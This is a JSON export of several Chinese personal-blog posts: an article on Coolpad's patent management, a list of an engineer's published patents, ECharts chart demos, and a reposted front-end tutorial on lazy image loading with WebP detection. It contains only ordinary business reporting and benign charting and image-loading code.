[{"title":"酷派集团：“五位一体”高效管理7000件专利申请","date":"2017-01-31T09:22:06.000Z","path":"2017/01/31/my-article-for-newspaper/","text":"文章下载 酷派集团：“五位一体”高效管理7000件专利申请 “非苹果，即酷派。”酷派集团董事长郭德英在去年世界互联网大会上的豪言壮语仍言犹在耳，这份自信不仅源于酷派集团雄厚的技术研发实力，还得益于其前瞻性的专利布局和高效的专利管理。 酷派集团在手机领域耕耘多年，掌握了手机领域的诸多核心技术，在智能手机技术研发、专利布局、产品创新和提升用户体验等方面积累了丰富的经验。 在持续开展专利布局的同时，如何对7000余件专利申请进行高效管理？酷派集团给出的答案是：通过实施“一把手工程”、打造“五位一体”专利布局体系和采用“开放式”的创新模式，制定了以“提升商业竞争力”为核心目标的知识产权战略，以此发挥专利的最大价值。 “一把手”的管理理念 郭德英是酷派集团的首席发明人，自2001年提交第一件专利申请开始，截至目前，他已提交了100多件专利申请。以郭德英为代表的公司领导对技术创新和专利布局的高度重视，并身体力行地践行着专利布局是“一把手工程”的发展理念，是酷派集团高效开展专利管理工作的关键。 “企业开展专利管理的基础是以自主创新能力作为支撑，并服务于公司战略发展需要，但关键因素是公司领导的高度重视和支持，而酷派集团实施的‘一把手工程’为我们开展专利管理工作提供了有力支撑。”酷派集团知识产权部经理汪智勇在接受中国知识产权报记者采访时表示。 “截至目前，酷派集团在全球范围内已提交了7000余件专利申请，其中90%以上是发明专利申请，内容涉及多模多待、双系统、UI交互、手机安全等方面。”汪智勇向本报记者介绍，目前，酷派集团已有1500余件专利申请获得授权，其中包括数十件涉及通信领域基础技术的基础专利和数百件提升酷派集团智能手机高端市场竞争力的核心专利。 得益于公司领导的高度重视，酷派集团很早就开展了专利管理工作，并确立了以“提升商业竞争力”为核心目标的知识产权战略。汪智勇介绍，酷派集团实施的知识产权战略包括3个方面，即立足研发、聚焦市场，知识产权工作要全方位嵌入公司的生产经营环节；建立完善的知识产权防御体系，支撑公司的经营战略，并提高公司开拓市场的自由度；降低知识产权风险，同时加强知识产权运营。 “五位一体”的专利布局 打造“体验、技术、产品、专利和标准”五位一体的专利布局体系是酷派集团专利管理工作的第二大特色，其核心思想为技术、产品、专利和标准都是以提升用户体验为出发点及落脚点，并相互融合促进。 汪智勇介绍，通过给业务部门设置专利考核指标等方式，酷派集团把专利布局嵌入到了产品生命周期的各个环节，以确保创新技术、产品能在第一时间得到全面的专利保护。 “五位一体”的专利布局体系为酷派集团高质量、全方位开展专利挖掘和布局工作奠定了基础。汪智勇介绍， “五位一体”中的体验是指日常生活中典型的用户场景或痛点；技术是指解决用户痛点、提升用户体验的创新技术，并在第一时间将其转化为产品，同时开展专利布局，并争取使其成为行业标准；产品是指产品立项和创新要以用户需求为中心，在遵循标准的基础上，结合用户对产品的反馈进一步开展技术创新和专利布局；专利是指以创新技术或产品为载体开展专利布局，并争取将其纳入到标准中，进而成为标准专利。 “通过加大技术创新力度，有效提高了专利质量。与此同时,在专利布局时开展的专利检索和数据分析也为产品创新开拓了新的视角。”汪智勇表示，通过实施“五位一体”的专利布局体系，酷派集团不仅提升了用户体验，而且还达到了体验、技术、产品、专利和标准“五位一体”的良好效果。 “开放式”的创新模式 对于不同的企业而言，其都会根据所在行业采取不同的专利管理策略。在汪智勇看来，专利管理工作要服务于公司的商业战略，并根据自身情况“量体裁衣”，这就需要企业专利管理人员结合移动互联网时代的新形势，提前做好应对和转型升级。 通常来说，传统企业的创新模式是封闭式的，企业的技术研发人员都是自主研发，而在移动互联网时代，企业的技术创新往往需要从外界获取大量创新资源，这就要求企业专利管理人员积极引导企业创新模式从“封闭式”逐渐转为“开放式”，比如企业可以与用户、供应商、科研院所、服务机构、行业协会，甚至竞争对手等相关部门建立协同创新机制。汪智勇向记者举例说，酷派集团每年有很多技术创新点源自高校合作项目或竞争对手的用户论坛等外部渠道。 在汪智勇看来， 企业专利管理人员要始终坚持“专利战略服务于商业战略”，因此，专利管理人员不仅要具有传统的技术思维和法律思维，还要具备相应的商业思维，比如使专利管理工作服务于产品宣传和品牌建设等。","comments":true,"categories":[{"name":"专利","slug":"专利","permalink":"http://ipcreator.me/categories/专利/"}],"tags":[{"name":"专利","slug":"专利","permalink":"http://ipcreator.me/tags/专利/"}]},{"title":"IPCreator专利清单","date":"2017-01-30T12:53:06.000Z","path":"2017/01/30/ipcreator-patent-list/","text":"检索方法1、打开专利检索网址大为；2、以“汪智勇”为关键字进行检索；3、在检索结果中，以申请（权利人）为“宇龙/Yulong” or “酷派/Coolpad”进行二次筛选便可得出结果。 备注 以下清单，基于2017.1.27日以前公开的专利库进行检索，未纳入未公开的相关专利申请（中国/PCT）。 专利清单 序号 公开号 专利名称 发明人 1 WO2013000123A1 PASTING METHOD AND TERMINAL THEREOF WANG ZHIYONG;YE BIQING;FENG YUHUI;LIU DONGHAI 2 WO2016106938A1 CONTACT-BASED SYSTEM SWITCHING METHOD AND APPARATUS AND TERMINAL LIU DONGHAI;WANG ZHIYONG 3 WO2016115760A1 TERMINAL SYSTEM CONTROL METHOD, DEVICE, AND TERMINAL LIU DONGHAI;WANG ZHIYONG 4 WO2016119288A1 DATA ACQUISITION METHOD, DATA ACQUISITION DEVICE AND TERMINAL XU XING;LIU DONGHAI;WANG ZHIYONG 5 WO2016173072A1 DATA INFORMATION PROCESSING METHOD, DATA INFORMATION PROCESSING DEVICE, AND TERMINAL ZHOU WEI;WANG ZHIYONG;PANG MIN 6 WO2016173075A1 SYSTEM SWITCHING METHOD AND DEVICE LIU DONGHAI;WU DIANQING;WANG ZHIYONG 7 WO2016192161A1 DATA PROCESSING METHOD AND DEVICE LIU DONGHAI;WANG ZHIYONG 8 WO2016192163A1 METHOD AND SYSTEM FOR REDUCING POWER CONSUMPTION OF MOBILE TERMINAL, AND MOBILE TERMINAL WU KEBIAO;WANG ZHIYONG 9 WO2017000341A1 INFORMATION PROCESSING METHOD, DEVICE, AND TERMINAL LIU DONGHAI;WANG ZHIYONG 10 WO2017000344A1 OPERATING METHOD AND TERMINAL BASED ON FINGERPRINT RECOGNITION LIU DONGHAI;WANG ZHIYONG 11 WO2017000354A1 FINGERPRINT PASSWORD VERIFICATION METHOD, SYSTEM, AND TERMINAL LIU DONGHAI;WANG ZHIYONG 序号 申请号 专利名称 发明人 1 CN201510344976.5 一种图像处理方法、装置及终端 吕楠;汪智勇;蒋罗 2 CN201510306351.X 一种用于降低移动终端功耗的方法和系统、以及移动终端 吴科标;汪智勇 3 CN201610567614.7 一种消息处理的方法及装置 吴殿清;汪智勇;闫娟;唐冬兰 4 CN201610565644.4 一种消息处理的方法及装置 吴殿清;汪智勇;闫娟;唐冬兰 5 CN2015082964 METHOD AND SYSTEM FOR REDUCING POWER CONSUMPTION OF MOBILE TERMINAL, AND MOBILE TERMINAL WU KEBIAO;WANG ZHIYONG 6 CN201610200631.7 一种指纹操作方法及终端设备 吴殿清;汪智勇;张娜;雷武 7 CN201610567587.3 一种消息处理的方法及装置 吴殿清;汪智勇;闫娟;唐冬兰 8 CN201610178390.0 基于智能水杯的信息调整方法、信息调整装置及智能水杯 吴殿清;汪智勇;闫娟;张娜 9 CN201610200353.5 一种多指纹混合登记的预警处理方法及移动终端 吴殿清;郭德英;汪智勇;张娜 10 CN201510236129.7 一种红外遥控方法及系统 吕楠;汪智勇;蒋罗 11 CN201510992251.7 一种应用程序下载安装方法及终端设备 刘东海;党乐;吴殿清;汪智勇 12 CN201610179140.9 用于智能水杯的控制方法、控制装置及智能水杯 吴殿清;汪智勇;闫娟;潘露杰 13 CN201610177989.2 用于智能水杯的控制方法、控制装置及智能水杯 涂欣;汪智勇;闫娟 14 CN201610184737.2 电梯控制方法、电梯控制装置和终端 梅各各;吴殿清;汪智勇;闫娟 15 CN201511019709.7 指纹识别的安全管理方法及装置、终端 刘东海;汪智勇 16 CN201610184821.4 通信处理方法及通信处理装置 潘晓;吴殿清;汪智勇;潘露杰 17 CN201610177915.9 基于智能水杯的信息调整方法、信息调整装置及智能水杯 吴殿清;汪智勇;闫娟;唐冬兰 18 CN201510369387.2 指纹密码的验证方法、系统和终端 刘东海;汪智勇 19 CN201510288979.1 虹膜信息采集方法、虹膜信息采集装置及终端 吕楠;蒋罗;汪智勇 20 CN201511018264.0 数据访问方法、数据访问系统和终端 刘东海;吴殿清;汪智勇 21 CN201510290387.3 水印嵌入方法、水印嵌入装置和终端 刘东海;汪智勇 22 CN201510458375.7 一种基于用户信息识别的设备控制方法及移动终端 刘东海;郭建军;李沙;吴殿清;汪智勇 23 CN201510460556.3 密码信息的验证方法、密码信息的验证系统和终端 刘东海;郭建军;吴殿清;汪智勇 24 CN201510615614.5 鉴权方法和终端 刘东海;汪智勇 25 CN201510374951.X 一种信息处理方法、装置以及终端 刘东海;汪智勇 26 CN201510374233.2 一种基于指纹识别的操作方法及终端 刘东海;汪智勇 27 CN201510282913.1 一种酒驾检测方法及终端、服务器 刘东海;汪智勇 28 CN201510456437.0 一种环境监控方法及用户终端 吴殿清;汪智勇;闫娟 29 CN201510734361.3 移动支付的监控方法、系统及智能终端 陈历伟;汪智勇 30 CN201510466796.4 指纹校验方法及装置 刘东海;郭建军;吴殿清;汪智勇 31 CN201510386218.X 一种数据处理方法及设备 刘东海;李仕伦;汪智勇 32 CN201510454769.5 一种室内环境监控方法及物联网终端 吴殿清;汪智勇;闫娟 33 CN201510854609.X 一种支付方法及其装置 陈历伟;汪智勇 34 CN201410464798.5 一种终端运行方法和装置 詹谷;黄焕荣;袁刚;汪智勇 35 CN201510848857.3 远程控制方法、远程控制装置、终端和远程控制系统 蒋罗;吕楠;汪智勇 36 CN201510623457.2 一种登录信息的配置方法、装置和移动终端 吴殿清;汪智勇;闫娟 37 CN201510618247.4 一种多系统间的应用安全保护方法及终端 刘东海;张碧君;汪智勇;吴殿清 38 CN201410303207.6 跨平台关联设备间的应用的安装方法及其系统 刘东海;汪智勇 39 CN201510615266.1 一种用户数据的保护方法及终端 刘东海;许奕波;吴殿清;汪智勇 40 CN201410195732.0 一种超级用户权限控制方法及装置 李仕伦;汪智勇;阳得常 41 CN201510611610.X 虹膜认证方法、虹膜认证装置及终端 梁文栋;黄习昌;闫娟;汪智勇 42 CN201410165760.8 一种安全驾驶的预警方法及系统 李仕伦;汪智勇;冯玉慧 43 CN201410066559.4 消息通知方法、消息通知装置、移动设备和消息通知系统 汪智勇;郭德英;郭建军;吴殿清;王文清 44 CN201510288853.4 一种数据处理方法和装置 刘东海;汪智勇 45 CN201510209238.X 一种系统切换方法和装置 刘东海;吴殿清;汪智勇 46 CN201510209832.9 数据信息处理方法、数据信息处理装置和终端 周威;汪智勇;庞敏 47 CN201510201478.5 系统切换方法、系统切换装置和终端 胡军杰;汪智勇 48 CN201410856593.1 多系统终端的系统切换方法、装置和终端 石爱民;汪智勇 49 CN201510054797.8 数据获取方法、数据获取装置和终端 许行;刘东海;汪智勇 50 CN201510044131.4 应用程序的运行控制方法、运行控制系统和终端 胡军杰;汪智勇 51 CN201410843159.X 基于联系人的系统切换方法及装置 刘东海;汪智勇 52 CN201410579593.1 丢失终端的管理方法及系统 刘东海;汪智勇;冯玉慧;叶必清;李仕伦 53 CN201510026623.0 一种终端系统的控制方法、装置和终端 刘东海;汪智勇 54 CN201410719656.9 一种汽车监控方法及系统 刘东海;汪智勇 55 CN201410453522.7 一种低电量提示方法、装置及终端设备 詹谷;黄焕荣;卓优;汪智勇 56 CN201410301262.1 一种基于虚拟键盘的文字输入方法及装置 林荣辉;汪智勇;陈运哲;战磊 57 CN201410204656.5 信息同步系统和信息同步方法 叶必清;汪智勇 58 CN201410056902.7 数据保护系统及方法 汪智勇;王正泽;王旭;郭德英;邓小英 59 CN201410099365.4 一种智能输入法切换方法及装置 叶必清;汪智勇 60 CN201410042322.2 一种终端及防止敏感信息泄露的方法 陈祥;汪智勇 61 CN201310625749.0 一种文件的传输方法及装置 李仕伦;汪智勇;叶必清 62 CN201310530882.8 商品信息的处理方法及装置 汪智勇;李俊;邓小英 63 CN201110451257.5 一种图片下载的方法、移动终端及服务器 冯玉慧;汪智勇;叶必清 64 CN201210527902.1 一种应用协同方法及移动终端 汪智勇;王文清;王正泽 65 CN2011076513 PASTING METHOD AND TERMINAL THEREOF WANG ZHIYONG;YE BIQING;FENG YUHUI;LIU DONGHAI 66 CN201110384354.7 一种应用程序安全预判装置及方法 汪智勇;朱宗伟;王新颖;冯玉慧 67 CN201110291506.9 终端和数据处理方法 罗彪;汪智勇;冯玉慧 68 CN201110283313.9 一种通信信息提醒方法、系统及移动终端 叶必清;廖迴敏;冯玉慧;汪智勇;刘东海;王新颖 69 CN201110301688.3 一种对数据进行操作的方法及移动终端 汪智勇;叶必清;冯玉慧 70 CN201110304416.9 一种应用程序的显示及分类方法、系统及移动终端 汪智勇;李自来;廖迴敏;冯玉慧 71 CN201110295666.0 好友搜索方法、设备和系统 冯玉慧;廖迴敏;王新颖;汪智勇 72 CN201110204888.7 应用程序管理方法和终端 汪智勇;叶必清;冯玉慧;刘东海;王新颖;张开营;廖迴敏 73 CN201110215246.7 终端和文件保存方法 汪智勇;冯玉慧;王新颖;廖迴敏 74 CN201110174335.1 应用程序管理装置和应用程序管理方法 汪智勇;叶必清;冯玉慧;刘东海 75 CN201110090127.3 一种应用程序访问权限设置方法、系统及移动终端 汪智勇;冯玉慧;李仕伦 76 CN201110084844.5 应用程序安装方法和终端 汪智勇;刘东海;冯玉慧 77 CN201110086742.7 手机应用分类管理方法及装置 冯玉慧;汪智勇 78 CN201110037376.6 一种应用程序监控方法及装置 汪智勇;叶必清;冯玉慧 79 CN201010624198.2 智能呈现联系人相关信息的方法、系统及移动终端 汪智勇;叶必清;冯玉慧;王志标;王玮;刘东海;李仕伦 80 CN201110044252.0 一种移动终端内应用程序的升级方法、移动终端及服务器 汪智勇;刘东海;冯玉慧 81 CN201110031882.4 一种基于android平台应用安装控制方法及系统 汪智勇;叶必清;冯玉慧 82 CN201010589186.0 信息处理方法及装置 叶必清;汪智勇;冯玉慧 83 CN201010596846.8 基于Android的应用程序升级方法、系统及应用开发平台 汪智勇;冯玉慧;刘东海;李仕伦;王玮;叶必清 84 CN201010598458.3 移动终端中应用运行条件的评估方法及装置、移动终端 汪智勇;冯玉慧;叶必清 85 CN201010523146.6 一种应用协同的操作方法、系统及移动终端 汪智勇;冯玉慧 86 CN201010578230.8 应用程序管理方法、装置以及终端 汪智勇;冯玉慧 87 CN201010508288.5 一种联系人菜单智能生成的方法、系统及移动终端 汪智勇;冯玉慧;孟宪衡;邱圣华 88 CN201020532495.X 一种触摸式移动终端 王灿;汪智勇;冯玉慧 89 CN201010531736.3 控制应用程序并行运行的方法、装置及具有该装置的终端 汪智勇;冯玉慧 90 CN201010286512.0 实现移动终端的一号多卡的方法和系统 邱圣华;张碧君;汪智勇;冯玉慧;孟宪衡;张毓华 91 CN201010282444.0 联系人分组方法及终端 汪智勇;冯玉慧;邱圣华;孟宪衡 92 CN201010270503.2 一种应用程序使用状态的提醒方法、系统及移动终端 汪智勇;冯玉慧 93 CN200910041406.3 一种终端功能协同方法及对应的终端 郭和平;汪智勇 94 CN200910040535.0 一种数据排序的方法及移动通信终端 汪智勇 95 CN200910038390.0 数据协同的方法、终端及系统 汪智勇 96 CN200810198086.8 一种终端监控方法、装置及系统 杨鹏辉;汪智勇 97 CN200810026989.8 一种信息显示方法、主机端及子机端 杨鹏辉;汪智勇","comments":true,"categories":[{"name":"专利","slug":"专利","permalink":"http://ipcreator.me/categories/专利/"}],"tags":[{"name":"专利","slug":"专利","permalink":"http://ipcreator.me/tags/专利/"}]},{"title":"Echarts Demo2","date":"2017-01-30T12:51:44.000Z","path":"2017/01/30/echarts-demo2/","text":"通过ECharts 插件直接运行增加标题信息 // 基于准备好的dom，初始化echarts实例 var myChart = echarts.init(document.getElementById('echarts1814')); // 指定图表的配置项和数据 var option = { title: { text: '男性女性身高体重分布', subtext: 'data from PM25.in', sublink: 'http://www.pm25.in', x:'center', textStyle: { color: '#fff' } }, tooltip: { trigger: \"axis\", showDelay: 0, axisPointer: { type: \"cross\", lineStyle: { type: \"dashed\", width: 1 } } }, legend: { bottom: 5, data: [\"女性\", \"男性\"] }, toolbox: { show: true, feature: { mark: { show: true }, dataZoom: { show: true } } }, xAxis: [ { type: \"value\", power: 1, precision: 2, scale: true } ], yAxis: [ { type: \"value\", power: 1, precision: 2, scale: true } ], series: [ { name: \"女性\", type: \"scatter\", data: [[161.2, 51.6], [172.9, 62.5], [153.4, 42], [160, 50], [147.2, 49.8], [168.2, 49.2], [175, 73.2], [157, 47.8], [167.6, 68.8], [159.5, 50.6], [175, 82.5], [166.8, 57.2], [176.5, 87.8], [170.2, 72.8], [174, 54.5], [173, 59.8], [179.9, 67.3], [170.5, 67.8], [162.6, 61.4]] }, { name: \"男性\", type: \"scatter\", data: [[174, 65.6], [164.1, 55.2], [163, 57], [171.5, 61.4], [184.2, 76.8], [174, 86.8], [182, 72], [167, 64.6], [177.8, 74.8], [180.3, 93.2], [180.3, 82.7], [177.8, 58], [177.8, 79.5], [177.8, 78.6], [177.8, 71.8], [177.8, 72], [177.8, 81.8], [180.3, 83.2]] } ] }; // 使用刚指定的配置项和数据显示图表。 myChart.setOption(option); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&#123;% echarts 400 '85%' %&#125;&#123; title: &#123; text: '男性女性身高体重分布', subtext: 'data from PM25.in', sublink: 'http://www.pm25.in', x:'center', textStyle: &#123; color: '#fff' &#125; &#125;, tooltip: &#123; trigger: \"axis\", showDelay: 0, axisPointer: &#123; type: \"cross\", lineStyle: &#123; type: \"dashed\", width: 1 &#125; &#125; &#125;, legend: &#123; bottom: 5, data: [\"女性\", \"男性\"] &#125;, toolbox: &#123; show: true, feature: &#123; mark: &#123; show: true &#125;, dataZoom: &#123; show: true &#125; &#125; &#125;, xAxis: [ &#123; type: \"value\", power: 1, precision: 2, scale: true &#125; ], yAxis: [ &#123; type: \"value\", power: 1, precision: 2, scale: true &#125; ], series: [ &#123; name: \"女性\", type: \"scatter\", data: [[161.2, 51.6], [172.9, 62.5], [153.4, 42], [160, 50], [147.2, 49.8], [168.2, 49.2], [175, 73.2], [157, 47.8], [167.6, 68.8], [159.5, 50.6], [175, 82.5], [166.8, 57.2], [176.5, 87.8], [170.2, 72.8], [174, 54.5], [173, 59.8], [179.9, 67.3], [170.5, 67.8], [162.6, 61.4]] &#125;, &#123; name: \"男性\", type: \"scatter\", data: [[174, 65.6], [164.1, 55.2], [163, 57], [171.5, 61.4], [184.2, 76.8], [174, 86.8], [182, 72], [167, 64.6], [177.8, 74.8], [180.3, 93.2], [180.3, 82.7], [177.8, 58], [177.8, 79.5], [177.8, 78.6], [177.8, 71.8], [177.8, 72], [177.8, 81.8], [180.3, 83.2]] &#125; ] &#125;;&#123;% endecharts %&#125;","comments":true,"categories":[{"name":"技术","slug":"技术","permalink":"http://ipcreator.me/categories/技术/"}],"tags":[{"name":"echarts","slug":"echarts","permalink":"http://ipcreator.me/tags/echarts/"}]},{"title":"Echarts Demo","date":"2017-01-30T12:51:44.000Z","path":"2017/01/30/echarts-demo/","text":"通过ECharts 插件直接运行 123&#123;% echarts 400 '85%' %&#125;\\\\TODO option goes here&#123;% endecharts %&#125; // 基于准备好的dom，初始化echarts实例 var myChart = echarts.init(document.getElementById('echarts8050')); // 指定图表的配置项和数据 var option = { tooltip : { trigger: 'axis', axisPointer : { // 坐标轴指示器，坐标轴触发有效 type : 'shadow' // 默认为直线，可选为：'line' | 'shadow' } }, legend: { data:['利润', '支出', '收入'] }, grid: { left: '3%', right: '4%', bottom: '3%', containLabel: true }, xAxis : [ { type : 'value' } ], yAxis : [ { type : 'category', axisTick : {show: false}, data : ['周一','周二','周三','周四','周五','周六','周日'] } ], series : [ { name:'利润', type:'bar', itemStyle : { normal: { label: {show: true, position: 'inside'} } }, data:[200, 170, 240, 244, 200, 220, 210] }, { name:'收入', type:'bar', stack: '总量', itemStyle: { normal: { label : {show: true} } }, data:[320, 302, 341, 374, 390, 450, 420] }, { name:'支出', type:'bar', stack: '总量', itemStyle: {normal: { label : {show: true, position: 'left'} }}, data:[-120, -132, -101, -134, -190, -230, -210] } ] }; // 使用刚指定的配置项和数据显示图表。 myChart.setOption(option);","comments":true,"categories":[{"name":"技术","slug":"技术","permalink":"http://ipcreator.me/categories/技术/"}],"tags":[{"name":"echarts","slug":"echarts","permalink":"http://ipcreator.me/tags/echarts/"}]},{"title":"深圳风采","date":"2017-01-30T07:08:06.000Z","path":"2017/01/30/view-of-shenzhen/","text":"“美好的事物值得付出、等待和分享” 月亮湾公园简介 地点：南山青青世界下边特色：百年荔枝古树、廉政主题推荐指数：☆☆☆☆","comments":true,"categories":[{"name":"个人","slug":"个人","permalink":"http://ipcreator.me/categories/个人/"}],"tags":[{"name":"个人","slug":"个人","permalink":"http://ipcreator.me/tags/个人/"}]},{"title":"Echarts Demo3","date":"2017-01-30T00:51:44.000Z","path":"2017/01/30/echarts-demo3/","text":"直接通过调用js脚本实现 var xAxisData = []; var data1 = []; var data2 = []; for (var i = 0; i < 100; i++) { xAxisData.push(i); data1.push((Math.sin(i / 5) * (i / 5 -10) + i / 6) * 5); data2.push((Math.cos(i / 5) * (i / 5 -10) + i / 6) * 5); } // 基于准备好的dom，初始化echarts实例 var myChart = echarts.init(document.getElementById('echarts9202')); // 指定图表的配置项和数据 var option = option = { title: { text: '' }, legend: { data: ['input', 'output'], align: 'left' }, toolbox: { // y: 'bottom', feature: { magicType: { type: ['stack', 'tiled'] } } }, tooltip: {}, xAxis: { data: xAxisData, silent: false, splitLine: { show: false } }, yAxis: { }, series: [{ name: 'input', type: 'bar', data: data1, animationDelay: function (idx) { return idx * 10; } }, { name: 'output', type: 'bar', data: data2, animationDelay: function (idx) { return idx * 10 + 1000; } }], animationEasing: 'elasticOut', animationDelayUpdate: function (idx) { return idx * 5; } }; // 使用刚指定的配置项和数据显示图表。 myChart.setOption(option); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;script type=\"text/javascript\"&gt;var xAxisData = [];var data1 = [];var data2 = [];for (var i = 0; i &lt; 100; i++) &#123; xAxisData.push(i); data1.push((Math.sin(i / 5) * (i / 5 -10) + i / 6) * 5); data2.push((Math.cos(i / 5) * (i / 5 -10) + i / 6) * 5);&#125;&lt;/script&gt;&lt;div id=\"echarts9202\" style=\"width: 100%;height: 250px;margin: 0 auto\"&gt;&lt;/div&gt;&lt;script src=\"http://echarts.baidu.com/dist/echarts.common.min.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt; // 基于准备好的dom，初始化echarts实例 var myChart = echarts.init(document.getElementById('echarts9202')); // 指定图表的配置项和数据 var option = option = &#123; title: &#123; text: '' &#125;, legend: &#123; data: ['input', 'output'], align: 'left' &#125;, toolbox: &#123; // y: 'bottom', feature: &#123; magicType: &#123; type: ['stack', 'tiled'] &#125; &#125; &#125;, tooltip: &#123;&#125;, xAxis: &#123; data: xAxisData, silent: false, splitLine: &#123; show: false &#125; &#125;, yAxis: &#123; &#125;, series: [&#123; name: 'input', type: 'bar', data: data1, animationDelay: function (idx) &#123; return idx * 10; &#125; &#125;, &#123; name: 'output', type: 'bar', data: data2, animationDelay: function (idx) &#123; return idx * 10 + 1000; &#125; &#125;], animationEasing: 'elasticOut', animationDelayUpdate: function (idx) &#123; return idx * 5; &#125;&#125;; // 使用刚指定的配置项和数据显示图表。 myChart.setOption(option);&lt;/script&gt;","comments":true,"categories":[{"name":"技术","slug":"技术","permalink":"http://ipcreator.me/categories/技术/"}],"tags":[{"name":"echarts","slug":"echarts","permalink":"http://ipcreator.me/tags/echarts/"}]},{"title":"Welcome to my blog.","date":"2017-01-29T11:37:06.000Z","path":"2017/01/29/hello-world/","text":"“欢迎访问我的个人博客” More info: my chinese blog（中文博客网易） 正整数：1、2、3、4、5、6、7 ，对应和弦：C、D、E、F、G、A、B，对应音符：Do、Re、Me、Fa、So、La、Ti 音乐家与程序员岁月如歌 1234刻度： 2品 2品 1品 2品 2品 2品 1品 2品 2品和弦：C +----&gt; D +----&gt; E +----&gt; F +----&gt; G +----&gt; A +----&gt; B +----&gt; C +----&gt; D +----&gt; ……音符：Do +----&gt; Re +----&gt; Me +----&gt; Fa +----&gt; So +----&gt; La +----&gt; Ti +----&gt; Do +----&gt; Re +----&gt; ……整数：1 +----&gt; 2 +----&gt; 3 +----&gt; 4 +----&gt; 5 +----&gt; 6 +----&gt; 7 +----&gt; 1 +----&gt; 2 +----&gt; …… Tables and alignment First Header Second Header Content from cell 1 Content from cell 2 Content in the first column Content in the second column Left-Aligned Center Aligned Right Aligned col 3 is some wordy text $1600 col 2 is centered $12 Table Syntax","comments":true,"categories":[{"name":"个人","slug":"个人","permalink":"http://ipcreator.me/categories/个人/"}],"tags":[{"name":"个人","slug":"个人","permalink":"http://ipcreator.me/tags/个人/"}]},{"title":"转：\"说到加载图片，我们可以谈些什么\"","date":"2015-04-28T15:54:00.000Z","path":"2015/04/28/zh-img-lazy-load/","text":"其实，一开始让我在网页中加载一张图片，我是，是拒绝的…因为实在太简单了。 &lt;img src=&quot;xx.jpg&quot; /&gt;是每个前端开发都会的技能。然而，如果你想做到极致，事情还没有这么简单。 最近实现了个图片加载器，用于大型web前端项目中，关于加载图片这一话题，仔细想来可以加许多的特技。 ###第一步：滚屏加载 这是最容易想到的点，也是一开始就准备做的。 随web体验的进步，滚屏加载代替分页加载的情形越来越多。也就是先预留图片位置，而不去加载图片，直到这个预留区域滚动到屏幕中，用户能看见了，才去加载图片。如此一来，有“按需加载”的意味，由于图片加载延后，不抢占带宽，在打开页面的首屏会快很多。我们称之为“懒加载(lazyload)”。 其实现也很简单，在html里面写&lt;img lazy-src=&quot;xx.jpg&quot; /&gt;，然后用js去判断这个节点是否出现在屏幕中，如果是，则取出lazy-src属性，赋值成&lt;img lazy-src=&quot;xx.jpg&quot; src=&quot;xx.jpg&quot;/&gt;，触发此节点onload，这就实现最简单的滚屏加载了。 ###第二步：特殊状态处理 特殊状态有两种：加载中与加载失败。这两种情况的处理逻辑相类似，拿加载中的逻辑做例子。 图片触发加载，到图片加载完成（或失败）之间，肯定会有一段时间。不做处理的话，用户在等待的过程中，就只能看到空白的区域，非常的奇怪。在低网速，以及用户非常快的拉滚动条的情形下，这种现象将更加明显。 那么在触发onload之前，就需要补一些逻辑，展示对应的loading图。将需要处理的img节点作为参数，调用tempImg函数，克隆一个节点强行插在img之前，用于loading中的展示。 123456789101112var tempImg = function(target)&#123; var w = target.width(); var h = target.height(); var tempDom = target.clone().addClass(\"lazy-loding\").insertBefore(target); if(w/h == 1)&#123; tempDom[0].src = \"http://9.url.cn/edu/img/img-loading.png\"; &#125;else&#123; tempDom[0].src = \"http://9.url.cn/edu/img/img-loading2.png\"; &#125; target.hide();&#125; ###第三步：上报监控 这一步在大型前端项目中非常重要，也是经常被忽略的地方。尽管需要简易的后台配合，但不算麻烦的上报监控，能让产品更加稳定和健壮。 我在两个地方用到了上报。其一是图片加载失败，触发onerror时，这样一来我们能知道每天图片拉取失败的量；其二是图片加载的时间，能够帮助我们分析cdn服务是否异常，分析全国慢速用户比例等等。 而所谓的上报其实就是一个http请求，我会大概把这些信息带上 123456 log(&#123; 'type': 'error', 'msg': 'lazyload拉取图片失败上报 ', 'url': window.location.href, 'pid': 414342 //产品对应的id&#125;); ###第四步：居中截取 这是前端无可避免的一个问题，先来说下此问题的背景。 由于我们是先用一个空白的img标签占位，再去加载图片，如果图片的高度特别长（比如新浪长微博），加载完成时就会撑开节点，引起滚动条的跳动。由于移动端屏幕较PC窄，一个跳动就可能让你找不到前一秒正在浏览的内容，这种体验尤其严重。在移动端的web设计中，可以看到许多知名互联网公司的产品，也经常忽略这一点。 因此我们可以限定占位区域的size，以此区域来做居中截取。当占位区域与图片最终展示同宽同高时，就不会引起跳动，而且也保持了视觉的一致性。 其原理如下，先判断是竖向长型图，还是横向长型图，根据不同的情况，优先让宽或高填充满占位区域，然后通过不同的负margin去实现居中。 123456789101112131415var calSize = function($img) &#123; var w = $img.width(), h = $img.height(), width = size[0], height = size[1]; if(w+h == 0) return; //如果是长型图，优先适配宽度，高度居中截取 if(w/h &gt; width/height)&#123; var newWidth = height * w / h; var margin = (width - newWidth)/2; $img.height(height).css(&#123;\"margin-left\": margin&#125;); &#125;else&#123; var newHeight = width * h / w; var margin = (height - newHeight)/2; $img.width(width).css(&#123;\"margin-top\": margin&#125;); &#125;&#125; ###第五步：支持webp webp格式图片是google开发的一种旨在加快图片加载速度的图片格式，压缩提交大概只有jpg的2/3。随chrome的比例越来越多，其实让更多用户体验到webp也是一件好事。 那么问题来了，怎么去判断用户的浏览器是否支持webp呢？根据ua去判断是个好方法，但不太靠谱，因为chrome中其实也有设置，让它不能去支持webp，而且webkit本身就开源，会衍生出很多你不知道名字的浏览器。 最终我使用的是特性检测： 12345678910111213141516if(!supportedWebPIsLoading) &#123; supportedWebPIsLoading = true; var images = &#123; basic: \"data:image/webp;base64,UklGRjIAAABXRUJQVlA4ICYAAACyAgCdASoCAAEALmk0mk0iIiIiIgBoSygABc6zbAAA/v56QAAAAA==\" &#125;, $img = new Image(); $img.onload = function () &#123; supportedWebPIsLoading = false; $.cookie.set(\"iswebp\" , +supportedWebP); &#125;; $img.onerror = function () &#123; supportedWebP = false; supportedWebPIsLoading = false; $.cookie.set(\"iswebp\" , +supportedWebP); &#125;; $img.src = images.basic;&#125; 我们会让浏览器试着加载一张非常小的base64格式的webp图片，如果能够正常加载，说明是支持webp的。 并且，会把测试记录在cookie里，所以第二次直接从cookie里读结果，基本不会影响性能。完成了最重要的检查，我们就可以放心让服务器返回不同格式的图片了。 